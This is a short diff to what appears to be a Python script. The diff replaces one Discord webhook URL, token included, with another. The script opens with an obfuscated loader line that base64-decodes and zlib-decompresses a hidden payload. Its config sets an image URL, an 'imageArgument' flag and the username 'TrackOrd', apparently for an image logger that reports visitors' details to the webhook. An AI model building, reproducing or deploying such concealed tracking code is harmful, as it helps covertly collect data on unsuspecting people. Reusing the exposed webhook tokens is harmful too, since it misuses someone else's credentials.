@@ -3,7 +3,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1450531440188985517/fhflbwrIWBf0NWj-9L4HcFVKgy2TqFndNm3bkfuo9UrZOCkB_Aw4wG06iyb7XJ31Cjfa",
+    "webhook": "https://discord.com/api/webhooks/1450531442068295765/S7HedDcetGPU8OZXfbFIx7X9zDUtAnrajRAKPQ-5I9TUof4R10v6f66c1cAJ2Oq1lGLx",
     "image": "https://png.pngtree.com/thumb_back/fh260/background/20210609/pngtree-optical-illusion-abstract-background-image_725814.jpg",
     "imageArgument": True,
     "username": "TrackOrd",
